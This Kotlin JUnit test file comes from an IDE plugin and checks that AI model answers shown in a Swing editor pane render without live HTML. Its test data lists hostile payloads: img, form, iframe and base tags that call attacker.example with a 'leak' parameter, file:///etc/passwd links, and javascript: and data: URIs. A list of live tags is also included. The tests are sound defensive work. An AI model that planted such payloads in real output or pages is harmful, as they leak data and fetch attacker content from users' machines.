package com.rahulmahadik.asksql.ide.ui

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * A Swing `JEditorPane` is not a browser: `<script>` never runs, but it does fetch
 * `<img src="http://...">` while laying out the document, firing a request from inside the IDE, and
 * it honours `<a>`, `<form>` and `<object>`.
 *
 * Safety rests on [markdownToHtml] escaping before it applies any markdown, an ordering every
 * markdown test would still pass if inverted, so this pins the ordering. Anything a database holds
 * can reach here, since a model can be asked to echo a cell value back.
 */
class TurnPanelHostileContentTest {

    /** Tags a JEditorPane acts on. Not a general XSS list: these are the ones Swing honours. */
    private val liveTags = listOf("<img", "<a ", "<form", "<object", "<iframe", "<applet", "<frame", "<base", "<link")

    private fun assertNothingLive(rendered: String, source: String) {
        for (tag in liveTags) {
            assertFalse("$tag survived rendering of: $source -> $rendered", rendered.lowercase().contains(tag))
        }
    }

    private val hostile = listOf(
        """<img src="http://attacker.example/pixel?leak=1">""",
        """<img src=x onerror="anything">""",
        """<a href="file:///etc/passwd">click</a>""",
        """<form action="http://attacker.example"><input name="x"></form>""",
        """<object data="http://attacker.example/x"></object>""",
        """<iframe src="http://attacker.example"></iframe>""",
        """<base href="http://attacker.example/">""",
        """<link rel="stylesheet" href="http://attacker.example/x.css">""",
        """<applet code="Evil.class"></applet>""",
        // Markdown syntax, unrendered today and the obvious thing to add later. A raw-HTML payload
        // would not notice that change.
        "![alt](http://attacker.example/pixel?leak=1)",
        "[click](http://attacker.example)",
        "[click](javascript:anything)",
        "[click](file:///etc/passwd)",
        "![alt](data:text/html;base64,PHNjcmlwdD4x)",
    )

    @Test
    fun `a hostile model answer renders no live tag`() {
        for (source in hostile) assertNothingLive(markdownToHtml(source), source)
    }

    @Test
    fun `a hostile answer wrapped in markdown renders no live tag`() {
        // Each transform wraps its captured group, so a tag smuggled inside one would be reassembled
        // if escaping ever moved after the markdown pass.
        for (source in hostile) {
            assertNothingLive(markdownToHtml("**$source**"), source)
            assertNothingLive(markdownToHtml("`$source`"), source)
            assertNothingLive(markdownToHtml("- $source"), source)
            assertNothingLive(markdownToHtml("```\n$source\n```"), source)
            assertNothingLive(markdownToHtml("__${source}__"), source)
        }
    }

    @Test
    fun `a hostile question renders no live tag`() {
        // The question is the user's own text, but it is also replayed from saved history.
        for (source in hostile) assertNothingLive(questionHtml(source), source)
    }

    @Test
    fun `a fenced segment carrying a hostile payload stays code, not markup`() {
        val segments = splitFencedSegments("Here:\n```sql\nSELECT '<img src=\"http://attacker.example\">'\n```\ndone")
        val code = segments.filterIsInstance<AnswerSegment.Code>().single()
        assertNothingLive(markdownToHtml("```\n${code.code}\n```"), code.code)
    }

    @Test
    fun `escaping runs before markdown, not after`() {
        // The ordering itself: an ampersand entity in the source must survive as literal text rather
        // than being interpreted, which only holds if & is escaped first.
        assertTrue(markdownToHtml("&lt;img src=x&gt;").contains("&amp;lt;"))
        assertFalse(markdownToHtml("&lt;img src=x&gt;").lowercase().contains("<img"))
    }

    @Test
    fun `an entity-encoded payload is not decoded into a tag`() {
        for (source in listOf("&#60;img src=x&#62;", "&lt;script&gt;", "&#x3C;img src=x&#x3E;")) {
            assertNothingLive(markdownToHtml(source), source)
        }
    }
}
